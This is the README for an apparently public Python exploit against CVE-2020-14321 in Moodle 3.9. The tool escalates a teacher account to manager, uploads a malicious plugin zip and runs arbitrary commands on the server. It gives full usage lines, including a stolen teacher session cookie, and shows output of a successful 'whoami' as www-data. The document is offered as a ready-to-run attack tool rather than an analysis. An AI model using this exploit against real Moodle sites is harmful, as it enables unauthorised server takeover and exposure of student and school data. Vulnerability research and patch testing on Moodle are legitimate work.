Python script to exploit [CVE-2020-14321](https://moodle.org/mod/forum/discuss.php?d=407393) - Course enrolments allowed privilege escalation from teacher role into manager role to RCE.

* Teachers of a course were able to assign themselves the manager role within that course.

Payload extracted from: https://github.com/HoangKien1020/CVE-2020-14321

## Usage

```bash
❭ python3 CVE-2020-14321_RCE.py -h
 __     __     __   __  __   __              __  __     
/  \  /|_  __   _) /  \  _) /  \ __  /| |__|  _)  _) /| 
\__ \/ |__     /__ \__/ /__ \__/      |    | __) /__  | • by lanz

Moodle 3.9 - Remote Command Execution (Authenticated as teacher)
Course enrolments allowed privilege escalation from teacher role into manager role to RCE
                                                        
usage: CVE-2020-14321_RCE.py [-h] [-u USERNAME] [-p PASSWORD] [-idm ID_MANAGER] [-idc ID_COURSE] [-c COMMAND] [--cookie TEACHER_COOKIE] url

[+] Examples:
    CVE-2020-14321_RCE.py http://moodle.site.com/moodle -u teacher_name -p teacher_pass
    CVE-2020-14321_RCE.py http://moodle.site.com/moodle --cookie thisisthefuck1ngcookieofmyteaaacher --cdomain moodle.site.com --cpath '/moodle/'

positional arguments:
  url                   URL Moodle site

optional arguments:
  -h, --help            show this help message and exit
  -u USERNAME           Teacher username, default: lanz
  -p PASSWORD           Teacher password, default: Lanz123$!
  -idm ID_MANAGER       Manager user ID, default: 25
  -idc ID_COURSE        Course ID valid to enrol yourself, default: 5
  -c COMMAND            Command to execute, default: whoami
  --cookie TEACHER_COOKIE
                        Teacher cookie (if you don't have valid credentials)
  --cdomain COOKIE_DOMAIN
                        Cookie domain (validate it with Cookiebro (mozilla)), default: moodle.site.com
  --cpath COOKIE_PATH   Cookie path (validate it with Cookiebro (mozilla)), default: /moodle/
```

If you have valid teacher credentials (IRL this has not been tested enough, or maybe yes, I don't know :P):

```bash
❭ python3 CVE-2020-14321_RCE.py http://moodle.site.com/moodle/ -u lanz -p Lanz123$!
```

If you have a valid teacher cookie (101% tested):

```bash
❭ python3 CVE-2020-14321_RCE.py http://moodle.site.com/moodle/ --cookie th3f7k1ngggk00ci30ft3ach3r --cdomain moodle.site.com --cpath '/moodle/'
```

Default command to execute is **whoami**:

```bash
❭ python3 CVE-2020-14321_RCE.py http://moodle.site.com/moodle/ --cookie th3f7k1ngggk00ci30ft3ach3r --cdomain moodle.site.com --cpath '/moodle/'
 __     __     __   __  __   __              __  __     
/  \  /|_  __   _) /  \  _) /  \ __  /| |__|  _)  _) /| 
\__ \/ |__     /__ \__/ /__ \__/      |    | __) /__  | • by lanz

Moodle 3.9 - Remote Command Execution (Authenticated as teacher)
Course enrolments allowed privilege escalation from teacher role into manager role to RCE
                                                        
[+] Login on site: MoodleSession:th3f7k1ngggk00ci30ft3ach3r ✓
[+] Updating roles to move on manager accout: ✓
[+] Updating rol manager to enable install plugins: ✓
[+] Uploading malicious file .zip: ✓
[+] Executing whoami: ✓

www-data

```

Enjoy <3
